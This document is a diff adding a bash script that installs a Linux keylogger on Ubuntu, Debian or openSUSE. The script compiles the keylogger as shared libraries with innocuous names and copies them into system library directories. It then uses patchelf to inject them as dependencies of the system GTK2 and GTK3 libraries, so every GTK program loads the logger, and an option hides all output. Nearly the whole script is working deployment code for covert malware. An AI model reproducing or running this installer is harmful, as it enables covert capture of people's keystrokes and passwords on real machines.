@@ -1,0 +1,254 @@
+#!/bin/bash
+#
+# Keylogger installation script
+#
+# Authors:
+#
+# Abel Romero Pérez aka D1W0U - abel@abelromero.com - @diw0u - http://www.abelromero.com 
+# David Reguera García aka Dreg - dreg@fr33project.org - @fr33project - http://www.fr33project.org.
+
+FORCE=0
+SILENT=0
+STDOUT_FD="/dev/stdout"
+STDERR_FD="/dev/stderr"
+DEFAULT_LOGPATH="/tmp"
+LOGPATH=$DEFAULT_LOGPATH
+DISTRO=""
+LIBKL="libksutil-1.so.0"
+KSTOOL="libasutil-1.so.0"
+
+TEMP=`getopt -o hsfl: --long help,silent,force,log-path: -n '$0' -- "$@"`
+eval set -- "$TEMP"
+
+# extract options and their arguments into variables.
+while true ; do
+    case "$1" in
+        -h|--help)
+          echo "$0 [options] [params]"
+          echo -e "-l, --log-path\tpath to save log files."
+          echo -e "-s, --silent\tdon't be verbose."
+          echo -e "-f, --force\tforce installation even libraries not supported."
+          echo "-h, --help"
+          exit 0
+            ;;
+        -s|--silent) SILENT=1 ; STDOUT_FD="/dev/null"; STDERR_FD="/dev/null"; shift ;;
+        -f|--force) FORCE=1 ; shift ;;
+        -l|--log-path) LOGPATH="$2" ; shift 2 ;;
+        --) shift ; break ;;
+        *) echo "Internal error!" ; exit 1 ;;
+    esac
+done
+
+# echo "LOGPATH"
+# echo $LOGPATH
+# echo "SILENT"
+# echo $SILENT
+# echo "FORCE"
+# echo $FORCE
+
+function check_gtk2_version {
+  if [[ "$1" != "2.24.30-1ubuntu1"
+    && "$1" != "2.24.30-4ubuntu2"
+    && "$1" != "2.24.30-4ubuntu3"
+    && "$1" != "2.24.25-3+deb8u1"
+    && "$1" != "2.24.31-12.1" ]]; then
+      if [[ "$FORCE" != "1" ]]; then
+        echo "GTK+2 version is not supported. Re-run me with --force flag."
+        exit 0
+      fi
+  fi
+}
+
+function check_already_installed {
+  if [[ -f "$LIBDIR/$KSTOOL" && -f "$LIBDIR/$LIBKL" ]]; then
+    echo "Already installed, skipping ..."
+    exit 0
+  fi
+}
+
+{
+  # test distro
+  DISTRO=`lsb_release -si`
+  # get arch
+  ARCH=`uname -m`
+
+  if [[ "$DISTRO" != "Ubuntu" ]]; then
+    if [[ "$DISTRO" != "Debian" ]]; then
+      if [[ "$DISTRO" != "openSUSE project" && "$DISTRO" != "openSUSE Leap" ]]; then
+        echo "This version only supports Ubuntu 16.04, Ubuntu 16.10, Debian 8.7 and openSUSE Leap 42.2"
+        exit
+      else
+
+        #
+        # Linux distribution is openSUSE
+        #
+        LIBDIR="/usr/lib64/"
+        DISTRO="OPENSUSE"
+
+        echo "Detected Linux distribution is openSUSE."
+        check_already_installed
+
+        # test gtk2 version
+        LINENUM=`zypper info libgtk-2_0-0 2>/dev/null | awk '/libgtk-2_0-0/{ print NR; exit }'`
+        LINENUM=$(expr $LINENUM + 4)
+        GTK2_VERSION=`zypper info libgtk-2_0-0 2>/dev/null | head -n $LINENUM | tail -n 1 | awk -F ' ' '{print $3}'`
+        check_gtk2_version $GTK2_VERSION
+
+        # install deps
+        echo "Installing deps ..."
+        zypper install cmake gcc-c++ gcc make
+
+      fi
+    else
+      #
+      # Linux distribution is Debian
+      #
+      if [[ "$ARCH" == "x86_64" ]]; then
+        LIBDIR="/usr/lib/x86_64-linux-gnu/"
+      else
+        LIBDIR="/usr/lib/i386-linux-gnu/"
+      fi
+
+      DISTRO="DEBIAN"
+
+      echo "Detected Linux distribution is Debian."
+
+      check_already_installed
+
+      # test gtk2 version
+      GTK2_VERSION=`dpkg -l libgtk2.0-0 | tail -n 1 | awk -F ' ' '{print $3}'`
+      check_gtk2_version $GTK2_VERSION
+
+      # install deps
+      echo "Installing deps ..."
+      apt-get install -y cmake g++ gcc make
+
+    fi
+  else
+
+    #
+    # Linux distribution is Ubuntu
+    #
+    if [[ "$ARCH" == "x86_64" ]]; then
+      LIBDIR="/usr/lib/x86_64-linux-gnu/"
+    else
+      LIBDIR="/usr/lib/i386-linux-gnu/"
+    fi
+    DISTRO="UBUNTU"
+
+    echo "Detected Linux distribution is Ubuntu."
+
+    check_already_installed
+
+    # test gtk2 version
+    GTK2_VERSION=`dpkg -l libgtk2.0-0 | tail -n 1 | awk -F ' ' '{print $3}'`
+    check_gtk2_version $GTK2_VERSION
+
+    # install deps
+    echo "Installing deps ..."
+    apt-get install -y cmake g++ gcc make
+
+  fi
+
+  # ask for log-path
+  if [[ "$LOGPATH" == "$DEFAULT_LOGPATH" ]]; then
+    read -p "Please, enter a logging path [$LOGPATH]: " LOGPATH
+    if [[ "$LOGPATH" == "" ]]; then
+      LOGPATH=$DEFAULT_LOGPATH
+    fi
+    cat >include/kl_config.h <<EOF
+
+#ifndef __KL_CONFIG
+  #define __KL_CONFIG
+
+  #define $DISTRO 1
+  #define SHOBJ_LIBNAME "$LIBKL"
+  #define KSTOOL_LIBNAME "$KSTOOL"
+  #define KLCFG_LOGPATH "$LOGPATH"
+
+  // This is the assembler tool, originally called kstool.
+
+  #define KLCFG_KSTOOL "$LIBDIR/"KSTOOL_LIBNAME
+
+#endif
+EOF
+
+cat >include/kl_config.S <<EOF
+
+.set $DISTRO, 1
+
+EOF
+
+  fi
+
+  # compile deps
+  cd deps
+
+  ## compile capstone
+  if [[ ! -f "./capstone-3.0.5-rc2/libcapstone.a" ]]; then
+    echo "Removing capstone directory ..."
+    rm -rf capstone-3.0.5-rc2
+    echo "Extracting capstone engine ..."
+    tar xzf capstone-3.0.5-rc2.tar.gz
+    cd capstone-3.0.5-rc2
+    echo "Compiling capstone engine ..."
+    ./make.sh
+    cd ..
+  fi
+
+  ## compile keystone
+  if [[ ! -f "./keystone-0.9.1/build/llvm/lib/libkeystone.a" ]]; then
+    echo "Removing keystone directory ..."
+    rm -rf keystone-0.9.1
+    echo "Extracting keystone engine ..."
+    tar xzf keystone-0.9.1.tar.gz
+    cd keystone-0.9.1
+    mkdir build
+    cd build
+    cmake -DCMAKE_BUILD_TYPE=Release -DBUILD_SHARED_LIBS=OFF -DLLVM_TARGETS_TO_BUILD="X86" -G "Unix Makefiles" ..
+    make -j 8
+    cd ../..
+  fi
+
+  ## compile patchelf
+  if [[ ! -f "./patchelf/src/patchelf" ]]; then
+    echo "Compiling patchelf ..."
+    cd patchelf
+    ./configure
+    make
+    cd ..
+  fi
+
+  # end of deps compilation
+  cd ..
+
+  if [[ ! -f "$KSTOOL" || ! -f "$LIBKL" ]]; then
+    # compile keylogger shared-object
+    echo "Compiling Keylogger ..."
+
+    # compile for x86 or x64 depending on $ARCH
+    if [[ "$ARCH" == "x86_64" ]]; then
+      make -f Makefile.x64
+    else
+      make -f Makefile.x86
+    fi
+
+  fi
+
+  # install keylogger
+  LIBGTK2=$(basename `readlink -f $LIBDIR/libgtk-x11-2.0.so.0`)
+  LIBGTK3=$(basename `readlink -f $LIBDIR/libgtk-3.so.0`)
+  rm -f $LIBDIR/$KSTOOL
+  rm -f $LIBDIR/$LIBKL
+  cp libasutil-1.so.0 libksutil-1.so.0 $LIBDIR
+  cp $LIBDIR/$LIBGTK2 .
+  cp $LIBDIR/$LIBGTK3 .
+  ./deps/patchelf/src/patchelf --add-needed libksutil-1.so.0 $LIBGTK2
+  ./deps/patchelf/src/patchelf --add-needed libksutil-1.so.0 $LIBGTK3
+  rm $LIBDIR/$LIBGTK2
+  rm $LIBDIR/$LIBGTK3
+  cp $LIBGTK2 $LIBGTK3 $LIBDIR
+  rm $LIBGTK2 $LIBGTK3
+  echo "done!"
+
+} >$STDOUT_FD 2>$STDERR_FD
